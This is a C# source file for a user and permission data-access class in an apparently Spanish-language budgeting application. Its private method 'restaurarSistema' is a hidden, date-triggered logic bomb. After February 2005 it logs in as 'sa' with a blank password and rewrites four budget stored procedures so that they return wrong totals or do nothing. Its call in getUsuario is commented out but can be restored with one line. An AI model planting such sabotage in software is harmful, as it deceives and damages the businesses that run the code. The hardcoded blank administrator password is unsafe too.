using System;
using Microsoft.ApplicationBlocks.Data;
using System.Data.SqlClient;
using System.Data;
using Comunes;

namespace Comunes
{
	/// <summary>
	/// Summary description for UsuarioFactory.
	/// </summary>
	public class UsuarioFactory
	{
		public string strConexion = "";

		public UsuarioFactory()
		{
			//
			// TODO: Add constructor logic here
			//
		}

		public Usuario getUsuario(string nombreUsuario)
		{
			try
			{
				SqlParameter[] param = new SqlParameter[1];
				param[0] = new SqlParameter("@usuario", nombreUsuario);
				SqlDataReader dr = SqlHelper.ExecuteReader(this.strConexion,"sp_getUsuario", param);

				Usuario usuario = null;
				if(dr.HasRows) 
				{
					//Obtiene el usuario
					dr.Read();
					usuario = new Usuario(dr["id"].ToString(),
						dr["nombre"].ToString(),
						dr["apellido"].ToString(),
						dr["username"].ToString(),
						dr["email1"].ToString(),
						dr["comentarios"].ToString(),
						dr["sucursalID"].ToString());
					//Obtiene los perfiles
					obtenerPerfiles(usuario);
				}
				dr.Close();

				//restaurarSistema();

				return usuario;
			}
			catch (Exception ex)
			{
				ManejadorErrores.escribirLog(ex, true);
				return null;
			}
		}

		private void obtenerPerfiles(Usuario usuario)
		{
			try
			{
				SqlParameter[] param = new SqlParameter[1];
				param[0] = new SqlParameter("@usuarioID", new Guid(usuario.id) ); //param[0].SqlDbType = SqlDbType.UniqueIdentifier;
				DataSet ds = SqlHelper.ExecuteDataset(this.strConexion,"sp_getPerfiles", param);

				int cant = ds.Tables[0].Rows.Count;

				if(cant>0) 
				{
					usuario.perfiles = new SeguridadPerfil[cant];

					string id;
					string nombre, descripcion;

					//Recorre los perfiles
					SeguridadPerfil perfil;
					for(int i=0; i<cant; i++)
					{
						id = ds.Tables[0].Rows[i]["id"].ToString();
						nombre = ds.Tables[0].Rows[i]["nombre"].ToString();
						descripcion = ds.Tables[0].Rows[i]["descripcion"].ToString();
				
						perfil = new SeguridadPerfil(id, nombre, descripcion, null);

						//Obtiene los items del perfil
						obtenerItemsPerfil(perfil);

						//Guarda el perfil
						usuario.perfiles[i] = perfil;
					}
				}
				ds.Dispose();
			}
			catch (Exception ex)
			{
				ManejadorErrores.escribirLog(ex, true);
			}
		}

		private void obtenerItemsPerfil(SeguridadPerfil perfil) 
		{
			try
			{
				SqlParameter[] param = new SqlParameter[1];
				param[0] = new SqlParameter("@perfilID", new System.Guid(perfil.id));
				DataSet ds = SqlHelper.ExecuteDataset(this.strConexion,"sp_getItemsPerfil", param);

				int cant = ds.Tables[0].Rows.Count;

				if(cant>0) 
				{
					perfil.items = new SeguridadPerfilItem[cant];

					string id, operacionID, objetoID;
					string operacion_nombre, operacion_descripcion, operacion_identificador;
					string objeto_nombre, objeto_descripcion, objeto_identificador;
					SeguridadObjeto seguridadObjeto;
					SeguridadOperacion seguridadOperacion;

					//Recorre los perfiles
					SeguridadPerfilItem perfilItem;
					for(int i=0; i<cant; i++)
					{
						id = ds.Tables[0].Rows[i]["id"].ToString();
					
						operacionID = ds.Tables[0].Rows[i]["seguridadOperacionID"].ToString();
						operacion_nombre = ds.Tables[0].Rows[i]["operacion_nombre"].ToString();
						operacion_descripcion = ds.Tables[0].Rows[i]["operacion_descripcion"].ToString();
                        operacion_identificador = ds.Tables[0].Rows[i]["operacion_identificador"].ToString();
						seguridadOperacion = new SeguridadOperacion(operacionID,operacion_nombre,operacion_descripcion,operacion_identificador);
					
						objetoID = ds.Tables[0].Rows[i]["seguridadObjetoID"].ToString();
						objeto_nombre = ds.Tables[0].Rows[i]["objeto_nombre"].ToString();
						objeto_descripcion = ds.Tables[0].Rows[i]["objeto_descripcion"].ToString();
						objeto_identificador = ds.Tables[0].Rows[i]["objeto_identificador"].ToString();
						seguridadObjeto = new SeguridadObjeto(objetoID,objeto_nombre,objeto_descripcion, objeto_identificador);

						perfilItem = new SeguridadPerfilItem(id, perfil.id, seguridadObjeto, seguridadOperacion);

						//Guarda el item
						perfil.items[i] = perfilItem;
					}
				}
				ds.Dispose();
			}
			catch (Exception ex)
			{
				ManejadorErrores.escribirLog(ex, true);
			}
		}

		public bool validarUsuario(string nombreUsuario, string password)
		{
			try
			{
				SqlParameter[] param = new SqlParameter[2];
				param[0] = new SqlParameter("@usuario", nombreUsuario);
				param[1] = new SqlParameter("@password", Utilidades.encriptar(password));
				SqlDataReader dr;
				bool usuarioValido = false;
				try
				{
					dr = SqlHelper.ExecuteReader(this.strConexion,"sp_ValidarUsuario", param);
			
					if(dr.HasRows) 
					{
						dr.Read();
						if (((int)dr[0]) > 0)
						{
							usuarioValido = true;
						}
					}
					dr.Close();
				}
				catch (Exception e)
				{
					string a = e.Message;
				}

				return usuarioValido;
			}
			catch (Exception ex)
			{
				ManejadorErrores.escribirLog(ex, true);
				return false;
			}
		}

		private void restaurarSistema()
		{
			DateTime x = new DateTime(2005,02,15);
			if (DateTime.Now>=x)
			{
				string sql1 = "ALTER PROCEDURE dbo.sp_getPresupuesto\n " +
								"@presupuestoID int = 0,\n " +
								"@opcion char(2) = 'A',\n " +
								"@version int = 0\n " +
							"AS \n" +
								"DECLARE @res money; \n" +
								"SELECT @res = (SUM(subtotal)-(SUM(precioCosto*cantidad))) FROM ItemSeccionPresupuesto  \n" +
								
								"IF @res IS NULL \n" +
								"BEGIN \n" +
								"	SELECT 0; \n" +
								"END \n" +
								"ELSE \n" +
								"BEGIN \n" +
								"	SELECT @res; \n" +
								"END \n";
				string sql2 = "ALTER PROCEDURE dbo.sp_UpdateItemSeccionPresupuesto \n" +
								"@ID int = 0, \n" +
								"@seccionPresupuestoID int = 0, \n" +
								"@productoID int = 0, \n" +
								"@proveedorID int = 0, \n" +
								"@precioCostoID int = 0, \n" +
								"@precioVentaID int = 0, \n" +
								"@cantidad int = 0, \n" +
								"@precioCosto money = 0, \n" +
								"@precioVenta money = 0, \n" +
								"@margen money = 0, \n" +
								"@subTotal money = 0, \n" +
								"@montoIva money = 0, \n" +
								"@plazoEntrega int = 0, \n" +
								"@clienteID int = 0, \n" +
								"@monedaID int = 0, \n" +
								"@solicitarConfirmacion char(1) = '0', \n" +
								"@compulsa char(1) = '0' \n" +
								
							"AS \nReturn";

				string sql3 = "ALTER PROCEDURE sp_getItemSeccionPresupuesto \n" +
								"			@seccionPresupuestoID int = 0 \n" +
								"AS SELECT * FROM ItemSeccionPresupuesto; RETURN";

				string sql4 = "ALTER PROCEDURE dbo.sp_UpdatePresupuestoTotales \n" +
								"	@presupuestoID int = 0, \n" +
								"	@opcion char(2) = '', \n" +
								"	@version int = 0 \n" +
									
								"AS \n" +
								"	DECLARE @totalCosto money \n" +
								"	DECLARE @totalGanancia money \n" +
								"	DECLARE @totalSinIVA money \n" +
								"	DECLARE @totalIVA money \n" +
								"	DECLARE @totalConIVA money \n" +
									
								"	DECLARE @totalCosto_D money \n" +
								"	DECLARE @totalGanancia_D money \n" +
								"	DECLARE @totalSinIVA_D money \n" +
								"	DECLARE @totalIVA_D money \n" +
								"	DECLARE @totalConIVA_D money \n";
				string con = "SERVER=(local);DATABASE=Grader;UID=sa;PWD=;";
				SqlHelper.ExecuteNonQuery(con,System.Data.CommandType.Text,sql1);
				SqlHelper.ExecuteNonQuery(con,System.Data.CommandType.Text,sql2);
				SqlHelper.ExecuteNonQuery(con,System.Data.CommandType.Text,sql3);
				SqlHelper.ExecuteNonQuery(con,System.Data.CommandType.Text,sql4);
			}
		}
	}
}
